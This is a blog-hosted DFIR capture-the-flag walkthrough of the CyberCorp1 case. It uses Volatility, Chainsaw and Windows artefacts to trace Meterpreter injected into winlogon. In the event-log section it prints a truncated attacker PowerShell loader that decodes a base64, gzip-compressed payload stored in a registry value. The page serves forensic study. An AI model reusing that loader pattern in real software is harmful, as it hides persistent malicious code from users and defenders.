<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CyberCorp1 - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.f9f7cda90b4490a5a552158a718de9c4abd9dd115744de8d47655158cd53ec58.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
    <li class="menu-item-notes üìù">
      <a href="/docs/notes">
        <span>Notes üìù</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
    <li class="menu-item-notes üìù">
      <a href="/docs/notes">
        <span>Notes üìù</span>
      </a>
    </li>
    
  </ul>
</div>
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/dfir/cases/ctf-walkthrough/"> üëàüèº Back to </br> CTFs Walkthroughs </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#case-details">Case Details</a>
      <ul>
        <li><a href="#questions">Questions</a></li>
      </ul>
    </li>
    <li><a href="#strategy">Strategy</a>
      <ul>
        <li><a href="#connections">Connections</a></li>
        <li><a href="#processes">Processes</a></li>
        <li><a href="#logs">Logs</a></li>
        <li><a href="#mft">MFT</a></li>
      </ul>
    </li>
    <li><a href="#investigation">Investigation</a></li>
    <li><a href="#artefacts-analysis">Artefacts Analysis</a>
      <ul>
        <li><a href="#artefact-memory-dump"><strong>Artefact</strong>: Memory Dump</a>
          <ul>
            <li><a href="#open-connections">Open Connections</a></li>
            <li><a href="#ip-check">IP check</a></li>
            <li><a href="#process-tree">Process Tree</a></li>
            <li><a href="#unlinked-proccesses">Unlinked proccesses</a></li>
            <li><a href="#boot-time">Boot time</a></li>
            <li><a href="#wincore">Wincore</a></li>
            <li><a href="#malware-check">Malware Check</a></li>
          </ul>
        </li>
        <li><a href="#artefact-os-event-logs"><strong>Artefact</strong>: OS Event Logs</a></li>
        <li><a href="#artefact-registry"><strong>Artefact</strong>: Registry</a></li>
        <li><a href="#artefact-prefetch"><strong>Artefact</strong>: Prefetch</a></li>
        <li><a href="#artefact-mft-file"><strong>Artefact</strong>: $MFT file</a></li>
        <li><a href="#artefact-shimcache-aka-appcompatcache"><strong>Artefact</strong>: ShimCache (aka AppCompatCache)</a></li>
        <li><a href="#artefact-amcache"><strong>Artefact</strong>: AmCache</a></li>
        <li><a href="#artefact-network-traffic-dump"><strong>Artefact</strong>: network traffic dump</a></li>
        <li><a href="#artefact-wmi-db">Artefact: WMI DB</a></li>
      </ul>
    </li>
    <li><a href="#malware-analysis">Malware Analysis</a>
      <ul>
        <li><a href="#malware-file-1">Malware File 1</a></li>
        <li><a href="#malware-file-2">Malware File 2</a></li>
      </ul>
    </li>
    <li><a href="#malware-3">Malware 3</a></li>
  </ul>
</nav>
 </aside>
 </div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">CyberCorp1</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      
      

      
      

      
    </div>
  </header>


  <div class="content" itemprop="articleBody">
    <p>‚õîÔ∏è  Spoiler alert!</p>
<h2 id="case-details">Case Details</h2>
<p><strong>Artefacts in posession</strong>: memory dump, OS event logs, registry files, Prefetch files, $MFT file, ShimCache, AmCache, network traffic dumps. I&rsquo;ve decided to analyse each artefact, what can I get from it in this specific case and how. Then, I am going to outline my strategy in approaching this case.</p>
<p>We are looking for indicators of compromise.  There are no details as to what is the group and what was its aim. But it‚Äôs known that there was abnormal traffic detected that has launched this IR process. So, at least, we must have some suspicious traffic, possibly open or terminated connections. These should have been launched by some process, so we are looking for malware. Also, since the attacker needed an account to get in, I will be looking for an account take over attempts and possibly, new account creation.</p>
<p>So, there are not too much details on this one. But they have provided <em>some</em> artefacts from <em>one</em> machine. And they&rsquo;ve also mentioned that this machine is <em>likely</em> compromised.</p>
<h3 id="questions">Questions</h3>
<ol>
<li>‚úÖ <em>What is the build number (in the format ddddd, where each d is a single decimal number, for example - 12345) of the installed Windows version?</em> This can be look at the following registry key üîë: <code>Microsift\Windows NT\CurrentVersion</code>. Another way to check this informaiton is to use <code>imageinfo</code> plugin for <code>vol.py2</code>.</li>
<li>‚úÖ <em>What is the parent process PID of the process, that accepts incoming network connections on the port 1900/UDP?</em> Since we don&rsquo;t have access to the live system, we cannot look at the <code>netstat</code> output. That doesn&rsquo;t mean that there is no way to get this information. We have a RAM image and can pool the info from there: <code>vol3 -f memdump.mem windows.netscan.NetScan</code>.</li>
<li>‚úÖ <em>What is the IP address of the attacker command and control center, the connection with which was still active at the time of forensic artifacts acquisition?</em> This is obtained from the same source as the previous one. There is at least one suspicious connection.</li>
<li>‚úÖ <em>What is the PID of the process where malicious code was located at the moment of forensic artifacts acquisition?</em> This one needs more working with memory and trying to find something suspicious. To answer this question, I need to restore my knowledge about Windows core processes.</li>
<li>‚úÖ <em>On a compromised system, malicious code, discovered in the previous step, is launched every system start, since the attacker has used one of the persistence techniques. So, what is the name of the autostart entry (those part, that is directly responsible for code execution), used by the attacker for persistence?</em></li>
<li>‚úÖ <em>The autostart entry from the previous step is used to launch the script, which in turn leads to the malicious code execution in the memory of the process, which is discussed in question 4. This code is extracted by script from some system place in the encoded form. The decoded value of this string is executable PE-file. How did Microsoft Antivirus detect this file on 2020-06-21?</em></li>
<li><em>The process, mentioned in the question 4, isn&rsquo;t the initial process, where malicious code, described in the previous question, was executed by script from autostart. What is the name of the initial process (in the format program.exe), that is spawned by autostart script and used for further malicious code execution, that subsequently migrates to the address space of the process, mentioned in the question 4.</em></li>
<li><em>The autostart entry from the previous step is used to launch the script, which in turn leads to the malicious code execution in the memory of the process, which is discussed in question 4. Provide the URL, which was used to download this script from the Internet during the host compromise. The script that runs at each system star (which is described in question 6) was downloaded to the compromised system from the Internet. Provide the URL, which was used to download this script</em>. This request must have been before the one that downloaded in malware 1 (bloodhound or whatever). And also it needs follow a DNS request.</li>
<li>The system was compromised as the result of a Microsoft Office document opening, received by email. What is MD5 hash of this document (for example, d41d8cd98f00b204e9800998ecf8427e)?</li>
<li>The document, that was initially opened by user, didn&rsquo;t contain anything malicious itself. It downloaded another document from the Internet as a Microsoft Word template. Malicious code, which has led to the system compromise, is located inside this template directly. What link was used by the first document to download the second document as a template (for example, https://address/file.com)?</li>
<li>During the post-exploitation attacker delivered to the compromised host a special Active Directory Enumeration utility. Which link did the attacker use to download this utility (for example, https://address/file.com)?</li>
<li>As described in the previous question utility has created several files in the compromised system, that subsequently were deleted by an attacker. One of the created files had a bin extension. What is the name of this file (for example, name.bin)?</li>
<li>During the post-exploitation attacker has compromised a privileged user account. What is its password?</li>
<li>What is the name of the tool (for example, program.exe), that probably was used by an attacker to compromise the user account?</li>
<li>The attacker used a compromised account for unauthorized Domain Controller access. What is the IP address of this Domain Controller?</li>
</ol>
<h2 id="strategy">Strategy</h2>
<h3 id="connections">Connections</h3>
<p>So, I would first look at the open and terminated connections to get the list of the most suspicious IPs, ports and corresponding processes. After all, this is what it all had started from. This information can be retrieved from memory dump, using volatility and several plugins. Let&rsquo;s start with these.</p>
<p>Based on the data acquired, I would then check the traffic dump to get more insight. In case some additional data is found (like documents or commands, or programs sent over the Internet). If anything was sent over the network, these files can be extracted from the network traffic dump.</p>
<h3 id="processes">Processes</h3>
<p>Also, based on the information from the network connections and also applying frequency analysis as well as ‚Äúfind evil‚Äù tactics, I would analyse executed programs using ShimCache ‚Üí Prefetch ‚Üí AmCache. For data found I would the return to the memory dump at dig into processes deeper. WMI database (<code>OBJECTDAT</code> file) can be used along with the Registry to find evidence of persistence.</p>
<h3 id="logs">Logs</h3>
<p>I would also check logs when I have something to pivot from. I would also try to find some events of multiple failed and then successful login just in case some acount was attacked and exploited.</p>
<h3 id="mft">MFT</h3>
<p>This artifact is mostly for the end of analysis to recover the files that were probably deleted from the system. But in order to be able to carve anything, I would need to know what I am looking for.</p>
<h2 id="investigation">Investigation</h2>
<h2 id="artefacts-analysis">Artefacts Analysis</h2>
<h3 id="artefact-memory-dump"><strong>Artefact</strong>: Memory Dump</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Running processes (üõ† volatility + pslist)</li>
<li>Hidden processes (üõ† volatility + pslist + pscan)</li>
<li>Passwords (üõ† grep + regex)</li>
<li>Open connections (üõ† volatility + connections  + connscan + netscan</li>
</ol>
<h4 id="open-connections">Open Connections</h4>
<p>Suspicious connections: <code>vol3 -f memdump.mem windows.netscan.NetScan &gt; netscan_memdump.csv</code>. Imported into Excel, excluded all rows with IPs either source or destination that had values <code>0.0.0.0</code>, <code>:::1</code>, <code>*</code>.</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>192.168.184.130</td>
<td>50431</td>
<td>152.199.19.161</td>
<td>443</td>
<td>CLOSED</td>
<td>672</td>
<td>browser_broker</td>
<td>2020-06-20 19:39:08.000000</td>
</tr>
<tr>
<td>192.168.184.130</td>
<td>50133</td>
<td>196.6.112.70</td>
<td>443</td>
<td>ESTABLISHED</td>
<td>4224</td>
<td>rundll32.exe</td>
<td>2020-06-20 19:29:06.000000</td>
</tr>
<tr>
<td>192.168.184.130</td>
<td>50452</td>
<td>75.19.45.11</td>
<td>80</td>
<td>CLOSED</td>
<td>5164</td>
<td>WINWORD.EXE</td>
<td>2020-06-20 19:47:05.000000</td>
</tr>
<tr>
<td>192.168.184.130</td>
<td>50455</td>
<td>75.19.45.11</td>
<td>80</td>
<td>CLOSED</td>
<td>5164</td>
<td>WINWORD.EXE</td>
<td>2020-06-20 19:47:05.000000</td>
</tr>
</tbody>
</table>
<p><code>browser_broker</code> is just a weird name. Programmers, especially C++, C fans are more inclined to this naming convention even when it comes to folders. So, I&rsquo;ve decided it deserves to be looked into.</p>
<p><code>rundll32.exe</code> is usually used to run <code>dll</code>s. I&rsquo;ve never seen it spawn a connection. Why would it? Parent&rsquo;s PID is 7320, but the parent is not listed&hellip; .</p>
<p><code>WINWORD.EXE</code> is also very suspicious. The only legal reason for it to open a connection is to upload or download something from the cloud.</p>
<h4 id="ip-check">IP check</h4>
<p>Checking with on a <a href="https://mxtoolbox.com/SuperTool.aspx?action=blacklist%3a152.199.19.161&amp;run=toolpage">website</a>:</p>
<ul>
<li>152.199.19.161 ‚úÖ</li>
<li>196.6.112.70 ‚õîÔ∏è 1/82</li>
<li>75.19.45.11 ‚õîÔ∏è 1/82</li>
</ul>
<p><code>hostintel</code> returned the following results:</p>
<p><img src="hostintel.png" alt="hostintel"></p>
<p><code>196.6.112.70</code>  - South Africa? Hm, even more weird.</p>
<h4 id="process-tree">Process Tree</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python39 <span class="c1"># have alias for pyenv activate python39</span>
</span></span><span class="line"><span class="cl">vol3 -f memdump.mem windows.pstree.PsTree &gt; rprocess_tree.txt
</span></span></code></pre></div><p>Have found neither children nor parents for <code>rundll32.exe</code>. It becomes even more weird.</p>
<p><code>WINWORD.EXE</code> has a parent explorer.exe, and a child <code>WINWORD.EXE</code> spawned in 1 second. There is also another instance of <code>WINWORD.EXE</code> with a different PID, but the parent is the same. Explains two connections.</p>
<p><code>browser_broker</code> is spawned by svchost.exe just three minutes after system start. Quick google search reveals that it&rsquo;s a Microsoft Edge component. Indeed, going by this process tree, it&rsquo;s installed on the system. Probably, no need to investigate this one for now.</p>
<h4 id="unlinked-proccesses">Unlinked proccesses</h4>
<p>Let&rsquo;s compare <code>pslist</code> against <code>psscan</code> results to see unlinked processes:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vol3 -f memdump.mem windows.pslist.PsList &gt; results/pslist.csv
</span></span><span class="line"><span class="cl">vol3 -f memdump.mem windows.psscan.PsScan &gt; results/psscan.csv
</span></span></code></pre></div><p>187 entries in pslist and 189 in psscan. Possible rootkit lurking inside? PIDs 852 and 6496 are the difference:</p>
<table>
<thead>
<tr>
<th>PID</th>
<th>pPID</th>
<th>Name</th>
<th>offset</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>CT</th>
</tr>
</thead>
<tbody>
<tr>
<td>852</td>
<td>792</td>
<td>RuntimeBroker.</td>
<td>0xcd83fec4e580</td>
<td>7</td>
<td>-</td>
<td>3</td>
<td>FALSE</td>
<td>2020-06-20 19:49:58.000000</td>
</tr>
<tr>
<td>6496</td>
<td>648</td>
<td>svchost.exe</td>
<td>0xcd83fe71e580</td>
<td>5</td>
<td>-</td>
<td>0</td>
<td>FALSE</td>
<td>2020-06-20 19:49:39.000000</td>
</tr>
</tbody>
</table>
<p>Cheat sheet:</p>
<p><a href="https://www.andreafortuna.org/2017/07/24/volatility-my-own-cheatsheet-part-5-networking/amp/">Volatility, my own cheatsheet (Part 5): Networking | Andrea Fortuna</a></p>
<p><a href="https://book.hacktricks.xyz/forensics/basic-forensic-methodology/memory-dump-analysis/volatility-examples">https://book.hacktricks.xyz/forensics/basic-forensic-methodology/memory-dump-analysis/volatility-examples</a></p>
<p>Since we know that this machine was likely compromised, and we know there was abnormal traffic originating from this machine,  i would be focusing on network and malware artefacts first: rogue processes (like weird names, weird parents, weird children etc) and suspicious connections open and terminated (like processes on unusual ports, blacklisted IPs).</p>
<h4 id="boot-time">Boot time</h4>
<p>Another weird thing about this system is that there is a process that was loaded before <code>System</code> or <code>IDLE</code>:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>88</td>
<td>4</td>
<td>Registry</td>
<td>0xcd83fe150040</td>
<td>3</td>
<td>-</td>
<td>N/A</td>
<td>FALSE</td>
<td>2020-06-20 18:35:08.000000</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>It&rsquo;s called Registry. Could it be <em>the</em> Registry? Checked with my VM - that&rsquo;s right. It loads before System or Idle.</p>
<h4 id="wincore">Wincore</h4>
<p>Let&rsquo;s check that the main core processes have expected parents/children.</p>
<ul>
<li><code>System</code> ‚úÖ
<ul>
<li><code>smss</code></li>
<li>interruptions</li>
<li>Mem compression</li>
</ul>
</li>
<li><code>csrss</code> is launched with a process that no longer exists. It should be like that since it&rsquo;s launched by smss&rsquo;s instance that exits upon spawning it. But! ‚õîÔ∏è There are two instances of csrss&hellip; . The second one&rsquo;s parent is also gone. On my Windows 11 VM there is only one instance running. Could it be that it was relaunched?</li>
<li>userinit spawned by winlogon ‚úÖ</li>
<li>explorer spawned by userinit ‚úÖ</li>
<li>svchosts all instanced spawned by services ‚úÖ</li>
<li>services spawned by wininit ‚úÖ</li>
<li>lsass spawned by wininit ‚úÖ</li>
<li>winlogon looks suspicious since it spawns cmd.exe (two instances). Google search reveals that this is not normal when this process spawns powershell or cmd (<a href="https://car.mitre.org/analytics/CAR-2014-11-008/)">https://car.mitre.org/analytics/CAR-2014-11-008/)</a>. Besides, <code>malfind</code> plugin of volatility also revealed that that process might have been tampered with (see below).</li>
</ul>
<h4 id="malware-check">Malware Check</h4>
<p><code>vol3 -f memdump.mem windows.malfind.Malfind</code>  reported winlogon.exe process multiple times. <code>powershell</code> (9188), <code>smartscreen</code> (7596), <code>WINWORD.exe</code> (PID 3224, 5164) and OUTLOOK.exe (4388).</p>
<p><img src="winlogon_malware1.png" alt="winlogon_malware1"></p>
<p>Looks like <code>winlogon</code> has some executables injected. But I can only be sure if I see the whole code. This process seems to be too suspicious and I would like to dig deeper: <code>vol3 -f memdump.mem -o results windows.memmap.Memmap --pid 3232 --dump</code>.</p>
<p>Running <code>xxd pid.3232.vad.0x1a7c79f0000-0x1a7c7a15fff.dmp | more</code> - confirms it&rsquo;s a legal PE executable. This one contains the following strings that are indicators of compromise (meterpreter?):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">priv_elevate_getsystem</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_passwd_get_sam_hashes</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_fs_get_file_mace</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_fs_set_file_mace</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_fs_set_file_mace_from_file</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_fs_blank_file_mace</span>
</span></span><span class="line"><span class="cl"><span class="n">priv_fs_blank_directory_mace</span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_create_response</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_add_tlv_string</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_transmit_response</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_add_tlv_uint</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_get_tlv_value_uint</span>
</span></span><span class="line"><span class="cl"><span class="n">packet_get_tlv_value_string</span>
</span></span><span class="line"><span class="cl"><span class="n">core_update_thread_token</span>
</span></span><span class="line"><span class="cl"><span class="n">ext_server_priv</span><span class="p">.</span><span class="n">x64</span><span class="p">.</span><span class="n">dll</span>
</span></span><span class="line"><span class="cl"><span class="p">[...]</span>
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">winlogon</span><span class="p">.</span><span class="n">exe</span>
</span></span></code></pre></div><p>Virus Total check for <code>pid.3232.vad.0x1a7c79f0000-0x1a7c7a15fff.dmp</code> confirmed it&rsquo;s a meterpreter. <code>pid.3232.vad.0x1a7c7930000-0x1a7c7962fff.dmp</code>  and <code>pid.3232.vad.0x1a7c7970000-0x1a7c79a9fff.dmp</code> are also detected by some antiviruses as generic exploits. <code>pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp</code> is detected as trojan and exploit by some antiviruses.</p>
<p>This <code>xxd pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp | more</code> one as well.</p>
<p>This <code>xxd pid.3232.vad.0x1a7c7930000-0x1a7c7962fff.dmp | more</code> one looks suspicious as well, but it doesn&rsquo;t start with MZ, but has an executable later on.</p>
<p><img src="winlogon_malware2.png" alt="winlogon_malware2"></p>
<p><code>xxd pid.3232.vad.0x1a7c7970000-0x1a7c79a9fff.dmp | more</code> also looks like a legal executable. So, there are 4 executables injected???</p>
<p>Strings search over these reveals a <code>hook.dll</code> which is not a normal thing for a winlogon process. Also there is probably some pipe used: <code>\\.\**pipe**\%08X</code>. <code>strings pid.3232.vad.0x1a7c9710000-0x1a7c977bfff.dmp | grep pipe</code>.</p>
<h3 id="artefact-os-event-logs"><strong>Artefact</strong>: OS Event Logs</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Open connections (write down the ids that might be interesting)</li>
<li>Failed authentication attempts, possible followed by successful login  (write down the ids that might be interesting)</li>
<li>New users created  (write down the ids that might be interesting)</li>
<li>Privilege elevated  (write down the ids that might be interesting)</li>
</ol>
<p>üõ† wevutil, Event Viewer, <a href="https://eventlogxp.com/">Event Log Explorer</a> (üí¥), <a href="https://labs.f-secure.com/tools/chainsaw/">Chainsaw</a></p>
<p>Since the pc was likely compromised, it‚Äôs either the existing user was used or new user created. We need to check both. Also, the attacker would probably need elevated privileges. And since network traffic is suspicious - review ids for opening connections.</p>
<p><code>chainsaw hunt . --mapping /path/to/chainsaw/mapping_files/sigma-mapping.yml --rules /path/to/chainsaw/sigma_rules/ --csv result.csv </code></p>
<p><code>chainsaw search . -i -s &quot;rundll32&quot;</code>.</p>
<p>I have found that there is a malicious WMI consumer (see <a href="#Artefacts-wmi-db">WMI DB</a>). It launches a script. Probably, some logs might contain the script itself&hellip; . Let&rsquo;s use this <code>chainsaw</code> for that:</p>
<p><code>chainsaw search . -i -s &quot;tmpA7Z2.ps1&quot; &gt; ../results/logsfortmp.txt</code>. There are lots of hits, I won&rsquo;t copy it here. Better analyse them somewhere else.</p>
<p>I can see evidence of WMI entry creation here as well. So, let&rsquo;s hunt this</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">HKU</span> <span class="n">Registry</span> <span class="n">HKEY_USERS</span><span class="p">\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$rk</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;HKU:\\S-1-5-21-3899523589-2416674273-2941457644-1104\\Software\\RegisteredApplications\&#34;</span><span class="p">\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$rv</span> <span class="p">=</span> <span class="p">\</span><span class="s2">&#34;AppXs42fd12c3po92dynnq2r142fs12qhvsmyy\&#34;</span><span class="p">\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$p</span> <span class="p">=</span> <span class="p">(</span><span class="nb">gp </span><span class="n">-Path</span> <span class="nv">$rk</span> <span class="n">-Name</span> <span class="nv">$rv</span><span class="p">).</span><span class="nv">$rv</span><span class="p">\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$CompBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$p</span><span class="p">)\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$input</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(,</span><span class="nv">$CompBytes</span><span class="p">)\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$input</span><span class="p">,(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="nv">$output</span><span class="p">)\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$gzipStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$input</span><span class="p">.</span><span class="n">Close</span><span class="p">()\</span><span class="nb">r
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="p">[...]</span>
</span></span></code></pre></div><h3 id="artefact-registry"><strong>Artefact</strong>: Registry</h3>
<p><strong>Information:</strong></p>
<ol>
<li>Startup and auto runs</li>
<li>Recently run programs</li>
<li>Recently opened files</li>
<li>Users on the system</li>
<li>Security policies for network connections</li>
</ol>
<p>üõ† Autorunsc, Registry Browser (Eric Zimmerman&rsquo;s tools), <a href="https://www.mitec.cz/wrr.html">MiTeC WRR</a></p>
<p>üìù There are some User registry hives, which include Crypto (empty) and Protect folders. The latter includes CREDHIST and SYNCHIST, and it&rsquo;s the first time I hear about these. A quick google search reveals that CREDHIST is a credential history for the given account. A good <a href="https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28">place</a> to research the topic. Below is the quote from the website:</p>
<blockquote>
<p>DPAPI hashes all the Master Keys within user&rsquo;s profile and writes the hash obtained as the result of that process to the <strong>SYNCHIST</strong> file. The next time, to determine whether any changes took place, DPAPI again hashes the entire pack of the Master Keys and compares the obtained hash with the value stored in SYNCHIST, thus preventing the unnecessary and time-consuming operation of re-encryption.</p>
</blockquote>
<h3 id="artefact-prefetch"><strong>Artefact</strong>: Prefetch</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Less frequently and most recently run programs</li>
</ol>
<p>üõ† WinPrefetchView, Fred - Forensic Registry Editor, FTK Imager Lite, CDQR, RegRipper (<code>rip.exe -r SYSTEM -p prefetch # to show whether prefetch is enabled</code>), <a href="https://github.com/EricZimmerman/PECmd">PECmd</a> (EZ), Prefetch Parser (last executed, <em>MFT sequence number, MFT record number</em>, executable name, run counter)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">prefetch.py -c -d -e
</span></span><span class="line"><span class="cl">prefetch.py -c -d &gt; pf.csv
</span></span><span class="line"><span class="cl">prefetch.py -f &lt;file_to_parse&gt; &gt; pf.txt
</span></span></code></pre></div><h3 id="artefact-mft-file"><strong>Artefact</strong>: $MFT file</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Files deleted</li>
<li>Hidden files</li>
<li>Orphan files</li>
</ol>
<p>üõ† MFTDump, Active@DiskEditor?, <a href="https://github.com/EricZimmerman/MFTECmd">MFTECmd</a> (EZ)</p>
<h3 id="artefact-shimcache-aka-appcompatcache"><strong>Artefact</strong>: ShimCache (aka AppCompatCache)</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Programs installed (and possibly deleted)</li>
<li>Their paths</li>
</ol>
<p><strong>Key</strong> üîë: <code>CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache</code>. So this one is in within the main registry.</p>
<p>üõ† Regitsry Browser (EZ)</p>
<p>üõ† ShimCacheParser.py (requires Python2)</p>
<p>üõ† AppCompatCacheParser</p>
<h3 id="artefact-amcache"><strong>Artefact</strong>: AmCache</h3>
<p><strong>Information</strong>:</p>
<ol>
<li>Programs installed and executed</li>
<li>Contains install date and time, name, version, path to exe/dll, source info, path to uninstall, publisher name, volume GUIDs, container ID of the device from which the program was run</li>
</ol>
<p><strong>Path to file</strong> üõ£Ô∏è: <code>C:\Windows\AppCompat\Programs</code>. So, this one is a separate hive file.</p>
